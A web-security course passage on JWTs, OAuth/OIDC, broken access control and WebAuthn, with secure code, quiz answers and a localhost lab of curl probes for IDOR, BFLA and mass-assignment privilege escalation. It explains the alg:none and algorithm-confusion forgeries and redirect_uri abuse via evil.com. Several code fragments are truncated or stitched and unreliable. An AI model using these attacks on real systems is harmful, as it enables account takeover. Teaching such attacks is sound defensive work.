The problem it solves: in a server-side session, every request costs a DB/Redis lookup to translate the opaque cookie id into "who is this." At scale, or across services that don't share a session store, that lookup is expensive or impossible. A JWT moves the trust into the token: the token *is* the claim, and a signature proves it wasn't tampered with.

**Anatomy — three base64url parts joined by dots: \`header.payload.signature\`.**
- **Header** — JSON describing the token: \`{"alg":"RS256","typ":"JWT"}\`. **This field is attacker-controlled input** — the source of the most famous JWT bug.
- **Payload (claims)** — the actual data: \`{"sub":"42","role":"user","iss":"...","aud":"...","exp":...,"iat":...}\`. Standard claims: \`sub\` (subject), \`iss\` (issuer), \`aud\` (audience), \`exp\` (expiry), \`iat\` (issued-at), \`nbf\` (not-before).
- **Signature** — the issuer computes \`sign(base64(header) + "." + base64(payload), key)\`; the verifier recomputes and checks for a match.

**Critical mental model #1 — base64 is NOT encryption.** The header and payload are merely base64url-*encoded*, fully reversible by anyone (\`atob\` it in the console). **A JWT hides nothing.** The signature gives *integrity* and *authenticity*, **not confidentiality** — which is why "store sensitive data in the payload" is a bug: you've published it.

**Critical mental model #2 — signing algorithms come in two families:**
- **HMAC (HS256/384/512)** — *symmetric*: the same secret signs and verifies. Fine for a single service. Dangerous across services because every verifier needs the signing secret (so any verifier can forge).
- **RSA / ECDSA (RS256, ES256, EdDSA)** — *asymmetric*: a **private** key signs, a **public** key verifies. Downstream services hold only the public key — they verify but cannot forge. The right choice for multi-service systems.

### The naive verification mistakes — derived

**Mistake #1 — "I decoded the token, so I know who the user is."** Decoding ≠ verifying. \`jwt.decode()\` reads the payload *without checking the signature*. An attacker edits the payload to \`"role":"admin"\`, re-base64s it, and decode-only code believes them. **You must verify the signature** and check the result.

**Mistake #2 — trusting the token's own \`alg\` field.** Two devastating variants:
- **\`alg: none\`.** The spec defines an "unsecured" mode with no signature. A naive library that honors the header's \`alg\` sees \`none\`, skips verification, and accepts *any* payload. The attacker sets \`{"alg":"none"}\`, writes \`"role":"admin"\`, drops the signature, and is admin.
- **Algorithm confusion (RS256 → HS256).** Your server verifies with the *public* key. The attacker changes the header to \`HS256\` and signs the token using your **public key as the HMAC secret**. A library that picks the algorithm *from the header* runs HMAC-verify with the public key — which the attacker also has — and the forgery validates. Fix: **never let the token tell you which algorithm to use. Pin it server-side.**

**Mistake #3 — not checking \`exp\`, \`iss\`, \`aud\`.** No expiry check = valid forever. No \`aud\` check = a token for service A replays against service B. No \`iss\` check = any issuer your library trusts is accepted.

### The revocation problem — the fundamental trade-off

Because a JWT is self-contained and verified by signature alone, **the server has no list to delete from.** Once issued, a JWT is valid until its \`exp\`, full stop. If a user logs out, you ban an account, or a token is stolen — it *keeps working until it expires.*

The standard resolution is the **access-token / refresh-token split:**
- **Access token** — a JWT with a *short* life (5–15 min), sent on every API call. Short-lived = a stolen one is useless within minutes.
- **Refresh token** — a *long-lived*, **opaque, server-stored** credential (a deletable row, so it *is* revocable). Used only to mint new access tokens. Logout/ban = delete the refresh row; the next refresh fails and the access token expires within minutes.

**Rotate refresh tokens on use** (issue a new one each refresh, invalidate the old) so a stolen-and-replayed refresh token is detectable — reuse of an already-rotated token signals theft → revoke the whole family.

**Key rotation.** Each key has a **\`kid\`** in the header; the verifier looks up the public key by \`kid\` from a published **JWKS** endpoint. You publish a new key, sign new tokens with it, and retire the old once outstanding tokens expire. (The \`kid\` lookup must itself be safe — see pitfalls.)

### 🛡️ Defense

**Root-cause principle:** *verify the signature with a server-pinned algorithm and key; never trust any field the token controls (especially \`alg\`); treat the payload as public; keep access tokens short and revoke via refresh tokens.*

**The non-negotiable verification checklist:**
1. **\`jwt.verify\`, never \`jwt.decode\`,** and check the result.
2. **Pin \`algorithms: ['RS256']\`** (your single chosen algorithm). Defeats \`alg:none\` *and* RS256→HS256 confusion.
3. **Verify \`iss\` and \`aud\`** match exactly.
4. **Enforce \`exp\`** (don't disable it) and short access-token TTLs.
5. **Use asymmetric keys (RS256/ES256/EdDSA) for multi-service** so verifiers can't forge.
6. **No secrets/PII in the payload** — it's public.
7. **Refresh-token rotation + server-stored refresh tokens** for revocation.
8. **Store the access token in memory** in an SPA (not \`localStorage\`); or better, keep the whole token server-side behind an \`HttpOnly\` cookie session (Module 6.2).

**Defense-in-depth:** short TTL → refresh rotation → server-side refresh store (revocable) → \`kid\`+JWKS key rotation → \`aud\`/\`iss\` scoping → in-memory client storage.

**Pitfalls and false-confidence traps:**
- **"My library is safe by default."** Some are, some aren't, and *misconfiguration* re-opens holes (permissive \`algorithms\` list, accepting \`none\` for testing and shipping it). Always pin explicitly.
- **JWKS \`kid\` injection / SSRF.** If you fetch the verification key from a URL/path derived from the token's \`kid\`/\`jku\`/\`x5u\`, an attacker points you at *their* key. Resolve keys only from a hard-coded, trusted JWKS endpoint; ignore \`jku\`/\`x5u\` from the token.
- **Clock skew.** Allow a small \`clockTolerance\` (a few seconds), no more.
- **"JWT logout works."** Deleting the cookie client-side doesn't invalidate the token server-side. True logout needs the refresh-token/blocklist machinery.
- **Putting the JWT in \`localStorage\` "because it's stateless."** Re-introduces the exact XSS theft problem from Module 6.2.

async function issueTokens(db, user) {
  const access = jwt.sign(
    { sub: user.id, role: user.role },
    PRIVATE_KEY,
    { algorithm: 'RS256', issuer: 'https://auth.example.com',
      audience: 'api.example.com', expiresIn: '10m' }  // WHY: short TTL bounds the revocation gap
  );
  const refresh = crypto.randomBytes(32).toString('hex');             // opaque, unguessable
  const refreshHash = crypto.createHash('sha256').update(refresh).digest('hex');

  return { access, refresh };
}

async function refresh(db, presented) {
  const h = crypto.createHash('sha256').update(presented).digest('hex');
  const { rows } = await db.query(
    \`SELECT user_id FROM refresh_tokens WHERE token_hash=$1 AND expires_at > now()\`, [h]);

  await db.query('DELETE FROM refresh_tokens WHERE token_hash=$1', [h]);
  const user = await getUser(db, rows[0].user_id);
  return issueTokens(db, user);

# ✅ SECURE verifier (RS256, pinned algorithm, iss/aud/exp enforced)
import os
import jwt
from functools import wraps
from flask import request, jsonify, g

PUBLIC_KEY = os.environ["JWT_PUBLIC_KEY"]  # PEM; private key lives only on the auth server

def require_auth(view):
    @wraps(view)
    def wrapper(*args, **kwargs):
        auth = request.headers.get("Authorization", "")
        token = auth[7:] if auth.startswith("Bearer ") else ""
        try:
            claims = jwt.decode(
                token, PUBLIC_KEY,
                algorithms=["RS256"],            # WHY: pin -> kills alg:none + RS256/HS256 confusion
                issuer="https://auth.example.com",   # verifies the "iss" claim
                audience="api.example.com",          # verifies the "aud" claim
                leeway=5,                        # WHY: tolerate tiny clock skew, no more
                options={"require": ["exp", "iss", "aud", "sub"]},  # reject tokens missing them
            )
        except jwt.InvalidTokenError:
            # one base class covers signature/exp/iss/aud/decode failures
            return jsonify(error="invalid token"), 401
        g.user = {"id": claims["sub"], "role": claims["role"]}  # role came from a SIGNED token
        return view(*args, **kwargs)
    return wrapper

            (h,))

### Knowledge check: JWTs

1. Why is it wrong to say a JWT "encrypts" the claims? What property does the signature actually provide?
2. Explain the \`alg:none\` attack and the RS256→HS256 confusion attack. What single defensive measure stops both?
3. Why does \`jwt.decode\` followed by a role check create a privilege-escalation bug?
4. State the JWT revocation problem and explain how the access/refresh split resolves it.
5. Why must refresh tokens be stored server-side, and why rotate them on every use?
6. When should you use HS256 vs RS256, and why is RS256 mandatory across multiple services?
7. What is the danger of resolving the verification key from the token's \`kid\`/\`jku\` header?

<details>
<summary>Show answers</summary>

1. The header and payload are only base64url-encoded (trivially reversible), so a JWT hides nothing — it is not encrypted. The signature provides integrity (not tampered) and authenticity (issued by the key-holder), not confidentiality. So never put secrets/PII in the payload.
2. \`alg:none\` exploits the spec's unsecured mode: set \`alg\` to \`none\`, drop the signature, and a naive verifier skips the check. RS256→HS256 confusion: the attacker switches the header to HS256 and signs with your *public* key as the HMAC secret; a verifier that picks the algorithm from the header validates the forgery. Both are stopped by pinning \`algorithms: ['RS256']\` server-side.
3. \`jwt.decode\` reads the payload without verifying the signature, so an attacker edits \`role\` to \`admin\`, re-encodes, and the role check trusts unverified data. You must \`jwt.verify\` and check the verified claims.
4. A JWT is valid until \`exp\` with nothing to delete server-side, so you can't revoke early. The split issues a short-lived access JWT (bounds the gap to minutes) plus a long-lived opaque refresh token stored server-side (a deletable row), so logout/ban deletes the refresh row and the access token expires shortly after.
5. Server-side storage makes the refresh token a revocable row (the only way to truly invalidate). Rotating on use means a stolen-and-replayed refresh token reuses an already-deleted value, detectable as theft and triggering revoking the whole token family.
6. HS256 (symmetric) is fine within a single service that both issues and verifies. RS256 (asymmetric) is required across services because verifiers hold only the public key — they verify but cannot forge — whereas HS256 would give every verifier the signing secret.
7. If the key is resolved from a token-controlled \`kid\`/\`jku\`/\`x5u\`, an attacker points you at a key they control (or SSRFs your server), and your verifier validates their forgery. Resolve keys only from a hard-coded, trusted JWKS endpoint and ignore token-supplied key URLs.
</details>

### 🎯 Concept: the problem OAuth was invented to solve

Imagine your app wants to import a user's Google contacts. The naive solution screams its own danger:

**Naive solution — "ask for the user's Google password and log in as them" — fails because** you'd be storing the user's *Google* password (catastrophic if leaked — Module 6.1), you'd have *total* access to their whole Google account (not just contacts), and you couldn't be revoked without the user changing their Google password globally. This is the "password anti-pattern," and OAuth exists to kill it.

**OAuth 2.0 is a *delegated authorization* protocol.** It lets a user grant your app **limited, revocable, scoped** access to their data on another service **without ever giving you their password.** The cast (every OAuth doc uses these names):
- **Resource Owner** — the user who owns the data.
- **Client** — your app, requesting access.
- **Authorization Server (AS)** — Google/GitHub/Okta's login + consent server that issues tokens.
- **Resource Server** — the API holding the data (Google Contacts API).
- **Scope** — the specific, limited permission (\`contacts.readonly\`, not "everything").
- **Access token** — the credential your app uses to call the Resource Server. Revocable, scoped, expiring.

**OAuth is authorization; OIDC adds *authentication / identity*.** This distinction causes more real bugs than almost anything else here:
- **OAuth 2.0** answers *"is this app allowed to do X with the user's data?"* It was **never designed to tell you who the user is.** An access token is a "valet key," not an ID card.
- **OpenID Connect (OIDC)** is a thin *identity* layer on top of OAuth 2.0. It adds the **\`id_token\`** — a JWT (Module 6.3!) that *proves who the user is* (\`sub\`, \`email\`, \`name\`, signed by the AS). For "Sign in with Google," **you want OIDC**, and you must consume the **\`id_token\`**, not the access token.

**Critical confusion to internalize — access token vs ID token:**
- The **\`id_token\`** is for *your app* to learn the user's identity. You verify it (it's a JWT — pin the algorithm, check \`iss\`/\`aud\`/\`exp\`/\`nonce\`).
- The **access token** is *opaque to you* — it's for calling the Resource Server. **You must NOT inspect an access token to decide who logged in.** Using an access token as proof of identity is a real, exploitable bug class.

### The Authorization Code flow with PKCE — the one flow you should use

The modern, secure default for web and mobile/SPA apps is **Authorization Code with PKCE**. The flow and the *reason* each piece exists:

1. Your app redirects the browser to the AS's \`/authorize\` endpoint with: \`client_id\`, \`redirect_uri\`, \`scope\`, \`response_type=code\`, a random **\`state\`**, and (PKCE) a **\`code_challenge\`** (SHA-256 of a secret **\`code_verifier\`** you keep).
2. The user authenticates *at the AS* (your app never sees the password) and consents to the scopes.
3. The AS redirects back to your \`redirect_uri\` with a short-lived **authorization code** (and your \`state\` echoed back).
4. Your *backend* exchanges that code at the AS's \`/token\` endpoint, sending the \`code\` plus the **\`code_verifier\`**. The AS returns the **access token** and (for OIDC) the **\`id_token\`**.

The reasons:
- **Why a *code* first, then a token exchange?** The code travels through the *browser* (a redirect URL — visible in history, logs, \`Referer\`). The actual *tokens* are returned over a direct back-channel POST from your server to the AS, never exposed in the browser.
- **Why \`state\`? — CSRF on the callback.** Without \`state\`, an attacker starts *their own* OAuth flow, captures *their* code, and tricks your logged-in victim into hitting your callback with the attacker's code — silently logging the victim into the *attacker's* account ("login CSRF"). \`state\` is a random value you generate, store in the session, and verify on return.
- **Why PKCE? — authorization-code interception.** On mobile/SPA the code can be intercepted. PKCE ties the code to a secret only your client knows: the AS only releases tokens if you present the \`code_verifier\` whose SHA-256 equals the \`code_challenge\` it saw. **PKCE is now recommended for *all* clients, including confidential server-side ones.**
- **Why \`nonce\` (OIDC)? — ID token replay.** You send a random \`nonce\`; the AS embeds it in the \`id_token\`; you verify it matches, preventing replay of a captured \`id_token\`.

### The developer risks — derived from the flow

- **Open redirect in the \`redirect_uri\`.** If the AS or your app accepts loosely-matched redirect URIs, an attacker abuses \`redirect_uri=https://yourapp.com.evil.com\` or a \`?next=//evil.com\` and the code/tokens get delivered to the attacker. **\`redirect_uri\` must be matched against an *exact, pre-registered allow-list*** — no wildcards, no substring matching, no open \`next=\` params.
- **Missing/flawed \`state\` validation.** Skipping \`state\`, or comparing it non-strictly, re-opens login CSRF. Generate it with a CSPRNG, bind it to the session, compare exactly, use once.
- **Confusing access token and ID token.** Treating the access token as proof of identity — or accepting an \`id_token\` whose \`aud\` isn't your \`client_id\` — lets a token issued for *another* app be replayed to log into yours. Consume the **\`id_token\`** for identity, and verify **\`aud\` == your client_id** and **\`iss\` == expected issuer**.
- **Trusting \`email\` without \`email_verified\`.** Some providers let users set an unverified email. If you match accounts by email, an attacker registers an OIDC identity with *your victim's* email and takes over the local account. **Only trust \`email\` when \`email_verified: true\`**, and prefer the stable \`sub\` as the account key.

**The demo, conceptually.** Build a callback that *omits* \`state\` verification:

Now simulate the attack: in one browser profile, start an OAuth flow as the "attacker" but stop at the AS-issued code (copy the \`?code=...\`). In a second profile (the "victim," already on your app), visit \`http://localhost:5050/callback?code=<attacker_code>\`. **Expected observation:** the victim's session is now bound to the *attacker's* identity — anything the victim does lands in the attacker's account. That is login CSRF, existing purely because \`state\` wasn't verified.

**Fix and re-test:** generate \`state\` before redirecting, store it in the session, reject the callback if \`req.query.state\` doesn't match. The pasted attacker code now fails because its \`state\` isn't the victim session's \`state\`.

### 🛡️ Defense

**Root-cause principle:** *use Authorization Code + PKCE; exchange tokens server-side; verify \`state\` and \`nonce\`; exact-match \`redirect_uri\`; consume the \`id_token\` (not the access token) for identity and validate its \`aud\`/\`iss\`/\`email_verified\`.*

**Defense-in-depth:** PKCE → exact redirect allow-list → \`state\` (CSRF) → \`nonce\` (replay) → \`id_token\` signature + \`aud\`/\`iss\`/\`exp\` checks → \`email_verified\` gate → short-lived session issued *after* you map the verified \`sub\` to a local account.

**Use a vetted library.** OAuth/OIDC are full of edge cases (PKCE, JWKS rotation, discovery, clock skew). Use \`openid-client\` (Node), \`Authlib\` (Python), or a hosted IdP (Auth0, Clerk, Cognito). Hand-rolling OAuth is a top source of auth bugs.

**Pitfalls and false-confidence traps:**
- **"I'm a confidential server app, so I don't need PKCE."** OAuth 2.1 says use PKCE *everywhere* — it costs nothing and closes code-interception paths.
- **Substring/prefix \`redirect_uri\` matching.** \`startsWith('https://app.com')\` matches \`https://app.com.evil.com\`. Use exact-equality against a registered set.
- **Open \`next\`/\`returnTo\` redirects after login.** A \`?next=//evil.com\` you honor is an open redirect. Allow-list internal paths only.
- **Reusing the access token to call your *own* backend as "proof of login."** Trust *your* session/\`id_token\`-derived identity, not a third-party access token.
- **Not verifying the \`id_token\` signature** because "it came from Google over TLS." TLS authenticates the channel, not the token's claims for *your* \`aud\`. Verify the JWT.

### 💻 Code Example: secure OIDC login (Node, \`openid-client\`)

const googleIssuer = await Issuer.discover('https://accounts.google.com'); // discovery doc + JWKS
const client = new googleIssuer.Client({
  client_id: process.env.GOOGLE_CLIENT_ID,
  client_secret: process.env.GOOGLE_CLIENT_SECRET,
  redirect_uris: ['https://app.example.com/callback'], // EXACT, pre-registered
  response_types: ['code'],
});

app.get('/login', (req, res) => {
  const code_verifier = generators.codeVerifier();             // PKCE secret
  const code_challenge = generators.codeChallenge(code_verifier);
  const state = generators.state();                            // CSRF token for the callback
  const nonce = generators.nonce();                            // replay protection for id_token
  // WHY: stash all three in the SESSION so the callback can verify them
  req.session.oauth = { code_verifier, state, nonce };
  res.redirect(client.authorizationUrl({
    scope: 'openid email profile',
    code_challenge, code_challenge_method: 'S256',
    state, nonce,
  }));
});

app.get('/callback', async (req, res) => {
  const { code_verifier, state, nonce } = req.session.oauth || {};
  const params = client.callbackParams(req);
  // WHY: library verifies state matches, exchanges code WITH the PKCE verifier,
  // verifies the id_token signature (via JWKS), and checks nonce + aud + iss + exp.
  const tokenSet = await client.callback(
    'https://app.example.com/callback', params, { state, nonce, code_verifier });

  const claims = tokenSet.claims();                            // the verified id_token claims
  if (!claims.email_verified) return res.status(403).send('verify your email with the provider');

  // WHY: key the local account on the stable, provider-scoped sub, not the editable email.
  const user = await findOrCreateBySub(claims.sub, claims.email);
  req.session.regenerate((err) => {                            // Module 6.2: rotate on login
    if (err) return res.sendStatus(500);
    req.session.userId = user.id;
    delete req.session.oauth;
    res.redirect('/dashboard');
  });
});

### 🎯 Concept: authentication vs authorization, and why authz is where breaches live

The distinction the whole module hinges on:
- **Authentication (authn)** = *who are you?* (Modules 6.1–6.4 — passwords, sessions, tokens, OAuth.)
- **Authorization (authz)** = *what are you allowed to do?* (This module.)

The uncomfortable truth: **authorization is the #1 OWASP Top 10 category** ("Broken Access Control," A01). It's where the *most* real breaches happen and the hardest to test automatically, because the bug is almost never "the code crashed" — it's "the code worked perfectly and returned someone else's data." A scanner sees a \`200 OK\`; only a human knows that \`200\` contained data the caller shouldn't see.

**The naive model — "check it in the UI" — fails because** hiding the "Delete" button only changes what the *browser draws*. The API endpoint behind it is still live, and an attacker uses \`curl\`/Burp/the console to call \`DELETE /api/projects/77\` directly. **The UI is not a security boundary. The server is.** *Authorization belongs at the data/action on the server, enforced on every request, never assumed from the UI.*

**The access-control models — when to use each:**
- **RBAC (Role-Based).** Users have **roles** (\`owner\`, \`admin\`, \`member\`, \`viewer\`); roles map to **permissions**. *Strength:* simple, auditable. *Weakness:* roles are coarse — "can this admin edit *this* project in *this* org?" needs more, and a global \`admin\` becomes a cross-tenant god-mode footgun.
- **ABAC (Attribute-Based).** Decisions computed from **attributes** of user/resource/environment: \`allow if user.department == resource.department AND user.clearance >= resource.classification\`. *Strength:* expressive, contextual. *Weakness:* policy sprawl; easy to write a too-permissive rule.
- **ReBAC (Relationship-Based).** Decisions follow **relationships in a graph**: "Alice can edit this doc because she's on the team that owns the folder." The Google Docs / GitHub model (Zanzibar). *Strength:* models sharing/nesting naturally. *Weakness:* needs a relationship store/engine (OpenFGA, SpiceDB, Oso).

Most full-stack apps start with RBAC, then bolt on **resource-ownership / tenant checks** (a lightweight ReBAC) — that's where the real bugs are.

**Multi-tenant authorization — the bug that hides in plain sight.** In SaaS, many orgs ("tenants") share one database. The deadly pattern: you correctly check *"is this user an admin?"* but forget *"is this resource in this user's tenant?"* So \`admin\` of Org A edits Org B's data by guessing IDs. **Every query that touches tenant data must be scoped to the caller's tenant** — ideally structurally (a \`WHERE org_id = $caller_org\` on *every* query, or Postgres Row-Level Security), not by remembering to add a check each time.

**The two canonical broken-access-control bugs (know these names cold):**
- **IDOR / BOLA (Broken Object-Level Authorization):** \`GET /api/invoices/123\` returns invoice 123 *without checking it belongs to the caller*. Change \`123\` to \`124\` and read someone else's. Fix: every object access verifies *ownership/relationship*, not just *authentication*.
- **BFLA (Broken Function-Level Authorization):** a non-admin calls an admin-only *endpoint* (\`POST /api/admin/promote\`) the UI merely hid. Fix: authorize the *function* server-side by role/permission, not by which menu rendered.

### The golden rules — and why each holds

1. **Authorize at the data/action, on the server, on every request.** (The UI is decoration.)
2. **Deny by default.** Start from "no access," then grant. A missing check should *fail closed* (403), never *fail open*. New endpoints should be inaccessible until explicitly opened.
3. **Check ownership/relationship, not just role.** "Is admin" ≠ "is admin *of this resource's tenant*."
4. **Re-fetch and re-check server-side; never trust client-supplied authority.** If the body says \`role: "admin"\` or \`org_id: 5\`, ignore it — derive authority from the *authenticated session*.
5. **Centralize the policy.** Scattering \`if (user.role === 'admin')\` across 200 handlers guarantees one gets forgotten. Put authz behind a single function/middleware/policy engine.

### ⚔️ Attack Demo: find an IDOR and a mass-assignment privilege escalation

> **Ethics & scope.** You will attack the **multi-tenant lab you build below**, on \`localhost\`, with accounts you create. IDOR-hunting against real apps without written authorization is illegal even when trivial. Your app, your data.

Build the project-management app (Users → Organizations → Projects → Tasks; roles owner/admin/member/viewer), then run four classic probes:

**Probe 1 — cross-tenant IDOR.** As a \`member\` of Org A, call another org's resource directly:
\`\`\`bash
curl -s http://localhost:6060/api/projects/PROJECT_IN_ORG_B -H "Cookie: $ORG_A_SESSION"
\`\`\`
*Vulnerable:* you get Org B's project. *Fixed:* \`403\`/\`404\`.

**Probe 2 — BFLA: viewer performs a write.** As a read-only \`viewer\`, call the edit endpoint the UI hides:
\`\`\`bash
curl -s -X PATCH http://localhost:6060/api/tasks/5 -H "Cookie: $VIEWER_SESSION" \\
  -H 'Content-Type: application/json' -d '{"title":"hacked"}'
\`\`\`
*Vulnerable:* the task changes. *Fixed:* \`403\`.

**Probe 3 — mass-assignment self-promotion.** Send a field the form never exposes:
\`\`\`bash
curl -s -X PATCH http://localhost:6060/api/users/me -H "Cookie: $MEMBER_SESSION" \\
  -H 'Content-Type: application/json' -d '{"name":"Joe","role":"owner"}'
\`\`\`
*Vulnerable (server spreads \`req.body\`):* you're now \`owner\`. *Fixed:* \`role\` is ignored.

**Probe 4 — stale token after deletion.** Delete/deactivate a user, then replay their old session/JWT. *Vulnerable (stateless JWT, no server check):* still works until expiry. *Fixed (server-side session or refresh-revocation):* \`401\`.

**Expected observation across all four:** the vulnerable versions return \`200\` and leak/modify data the caller had no right to. **Nothing "errored" — the code did exactly what it was told.** This is why broken access control is so dangerous and so under-detected.

### 🛡️ Defense

**Root-cause principle:** *derive the caller's identity and authority from the authenticated session, then on every request check (a) the function/role and (b) the specific object's ownership/tenant — failing closed.*

**Defense-in-depth layers:** authn (session/JWT) → tenant scoping on every query (or Postgres RLS) → object-ownership check → role/permission check → DTO output filtering → audit logging of denied attempts → server-side revocation.

**Pitfalls and false-confidence traps:**
- **"I check the role in middleware, so I'm covered."** Role middleware catches BFLA but *not* IDOR — \`admin\` middleware still lets an admin of Org A touch Org B. You need the *object/tenant* check too.
- **Trusting \`org_id\`/\`role\` from the body or a client-influenced JWT claim.** Always re-derive from the server's session; scope queries by the *session's* org, never a body parameter.
- **Sequential, guessable IDs.** Auto-increment IDs make IDOR trivial to enumerate. UUIDs raise the bar but are **not** a fix — *you still must authorize*. (Treating "unguessable ID" as security is security-through-obscurity.)
- **Returning the raw DB row.** Even with correct access, \`SELECT *\` leaks internal fields (\`password_hash\`, soft-delete flags). Map to an explicit DTO.
- **Forgetting the *new* endpoint.** Authz bugs cluster on recently-added routes. "Deny by default" + centralized policy is what saves you.

async function authorizeTask(user, taskId, action) {
  const task = await db.get(
    // WHY: scope the lookup to the user's tenant in the QUERY itself -> cross-tenant IDOR
    // is structurally impossible; an out-of-tenant id simply returns nothing.
    \`SELECT t.*, p.org_id FROM tasks t JOIN projects p ON p.id = t.project_id
      WHERE t.id = ? AND p.org_id = ?\`, taskId, user.org_id);

  if (action === 'write' && !canWrite) return { ok: false, status: 403 }; // BFLA closed
  return { ok: true, task };

  const p = await db.get(
    'SELECT id, name, status FROM projects WHERE id = ? AND org_id = ?', // tenant-scoped + DTO columns

  const { name } = req.body;
  await db.run('UPDATE users SET name = ? WHERE id = ?', name, req.user.id);

  const decision = await authorizeTask(req.user, req.params.id, 'write');
  if (!decision.ok) {
    auditLog('denied', { user: req.user.id, task: req.params.id, status: decision.status });
    return res.sendStatus(decision.status);

For real multi-tenant scale, push tenant isolation into the database with **Postgres Row-Level Security (RLS)** so the DB itself refuses cross-tenant rows even if a query forgets the \`WHERE\`:

\`\`\`sql
ALTER TABLE projects ENABLE ROW LEVEL SECURITY;
-- WHY: even a buggy query can't escape the tenant; the DB enforces it.
CREATE POLICY tenant_isolation ON projects
  USING (org_id = current_setting('app.current_org')::int);
-- the app sets: SET app.current_org = '<session org_id>'; per connection/transaction
\`\`\`

# ✅ SECURE — centralized authz: tenant scope + ownership + role, fail closed, DTO output
from functools import wraps
from flask import g, request, jsonify, abort
from pydantic import BaseModel, ValidationError

# --- RBAC: function-level (BFLA) guard as a reusable decorator ---
def require_role(*allowed_roles):
    def decorator(view):
        @wraps(view)
        def wrapper(*args, **kwargs):
            if g.user["role"] not in allowed_roles:
                audit_log("denied", user=g.user["id"], reason="role", path=request.path)
                abort(403)                       # fail closed
            return view(*args, **kwargs)
        return wrapper
    return decorator

# --- BOLA/IDOR: object-level guard, scoped to the user's tenant in the QUERY ---
def authorize_task(user, task_id, action):
    task = db.fetchone(
        # WHY: scope the lookup to the user's tenant in the query itself -> cross-tenant
        # IDOR is structurally impossible; an out-of-tenant id simply returns nothing.
        """SELECT t.*, p.org_id FROM tasks t JOIN projects p ON p.id = t.project_id
            WHERE t.id = %s AND p.org_id = %s""", (task_id, user["org_id"]))
    if not task:
        return (None, 404)                       # not found OR not your tenant -> 404
    if action == "write" and user["role"] not in ("owner", "admin", "member"):
        return (None, 403)                       # viewer is read-only -> BFLA closed
    return (task, 200)

# allow-list of fields a user may change about themselves (defeats mass assignment)
class UserSelfUpdate(BaseModel):
    name: str                                    # NOTE: 'role' is deliberately absent

@app.get("/api/projects/<int:pid>")
@require_auth
def get_project(pid):
    p = db.fetchone(
        # tenant-scoped + explicit DTO columns (no SELECT *)
        "SELECT id, name, status FROM projects WHERE id = %s AND org_id = %s",
        (pid, g.user["org_id"]))
    if not p:
        abort(404)                               # fail closed
    return jsonify(p)

@app.patch("/api/users/me")
@require_auth
def update_me():
    try:
        # WHY RIGHT: pydantic ignores unknown keys, so {"role": "owner"} never reaches
        # the UPDATE -> no privilege escalation.
        data = UserSelfUpdate.model_validate(request.get_json())
    except ValidationError as e:
        return jsonify(error=e.errors()), 400
    db.execute("UPDATE users SET name = %s WHERE id = %s", (data.name, g.user["id"]))
    return jsonify(ok=True)

@app.patch("/api/tasks/<int:tid>")
@require_auth
def update_task(tid):
    task, status = authorize_task(g.user, tid, "write")
    if not task:
        audit_log("denied", user=g.user["id"], task=tid, status=status)
        abort(status)
    db.execute("UPDATE tasks SET title = %s WHERE id = %s",
               (request.get_json()["title"], tid))
    return jsonify(ok=True)
\`\`\`

> **Why a decorator for roles but a function for objects?** Roles are *function-level* — "can a viewer call this endpoint at all?" — so a decorator that runs before the handler fits (Django's \`@permission_required\` / DRF's \`permission_classes\` do the same). Object-level checks need the specific object id and tenant, so they live inside the handler. You need **both**: the decorator alone still lets an \`admin\` of org A edit org B; the object check alone still lets a \`viewer\` write. The Postgres RLS policy is the third, deepest layer — keep it even with the app checks, because defense-in-depth assumes one layer will be forgotten.

### 🎯 Concept: why "stop using passwords" is the strongest fix of all

Everything in Modules 6.1–6.4 is *damage control around a fundamentally broken primitive.* A password is a **shared secret** the user can be tricked into revealing (phishing), reuses across sites (credential stuffing), and that you must store and hope you stored well. No amount of Argon2id fixes the fact that a human can be social-engineered into typing the secret into \`g00gle-login.com\`. The only way to *eliminate* a class of bugs is to remove the thing that causes it. **WebAuthn removes the shared secret entirely.**

**WebAuthn** (the W3C standard) and **passkeys** (Apple/Google/Microsoft's consumer branding on top of WebAuthn) replace the shared secret with **asymmetric public-key cryptography** (the same family as RS256 in Module 6.3), bound to the user's device.

**Four-level explanation.**
- **Toddler.** "My phone says hi to the website with a special handshake nobody can copy."
- **15-year-old.** Instead of typing a password, your laptop or phone signs a one-time challenge with a private key it never reveals. The website only stores the matching public key. A fake site can't trick you because the browser checks the real domain before signing.
- **Developer.** The browser exposes \`navigator.credentials.create()\` (registration) and \`navigator.credentials.get()\` (authentication). The server sends a random challenge; the browser asks the platform authenticator (Touch ID / Windows Hello / a YubiKey) to sign it with a key scoped to your domain; the server verifies with the stored public key.
- **Professional.** A FIDO2/WebAuthn credential is a P-256 (or Ed25519) keypair scoped to the **relying-party ID (RP ID)** = your eTLD+1. It is *origin-bound by the browser*, which is what makes it phishing-resistant by construction. **Resident/discoverable credentials** ("passkeys") sync via iCloud Keychain / Google Password Manager / 1Password, solving the device-loss problem that doomed earlier hardware-token schemes.

### The naive instinct WebAuthn replaces — and *why public-key auth beats it*

**Naive solution — "send the secret to prove you have it" — fails because** any time the user *transmits* the secret (password, OTP, magic link code), it can be intercepted, phished, replayed, or logged. Even one-time codes are phishable in real time (a proxy site relays your code to the real site instantly — "adversary-in-the-middle"). The fix: **prove possession of a private key without ever sending it.** That's a *challenge-response signature* — the server sends a random challenge, the client signs it, the server verifies with the public key. The private key never leaves the device; there is nothing to intercept.

**The phishing-resistance mechanism — the part that matters most.** When the authenticator signs, it signs over data that **includes the origin the browser is actually on**, and the credential is scoped to a specific **RP ID**. If the user is on \`g00gle-login.com\`, the browser **refuses to use** the credential registered for \`google.com\` — the RP IDs don't match. The user cannot be tricked into handing over a usable signature to the wrong site, because *the browser, not the user, checks the domain.* TOTP/SMS codes have the opposite property: a human will happily type a code into a convincing fake. WebAuthn removes the human from the trust decision.

### Why it matters for full-stack devs

- **Eliminates password-storage bugs** — no passwords to hash, salt, pepper, or leak (Module 6.1 risk → zero for passkey accounts).
- **Eliminates credential stuffing** — there's no reusable shared secret to stuff.
- **Eliminates phishing** for the protected account — the killer feature.
- **Better UX** — one Touch ID tap replaces "password + SMS code."

### The two ceremonies — and what the server must verify in each

**Registration** (\`navigator.credentials.create\`): the server issues a challenge; the authenticator generates a *new* keypair, keeps the private key, and returns the public key + credential ID + (optionally) attestation. The server stores the public key, credential ID, and the **signature counter**.

**Authentication** (\`navigator.credentials.get\`): the server issues a fresh challenge; the authenticator signs it; the server verifies the signature. On **every** authentication, the server must check all of:
1. **Signature** verifies against the stored public key.
2. **Challenge** matches the one *this server* just issued (single-use, server-stored) — defeats replay.
3. **Origin** is exactly your expected origin — defeats cross-origin abuse.
4. **RP ID hash** matches your RP ID — the phishing-resistance check.
5. **User-presence/verification flags** are set as required.
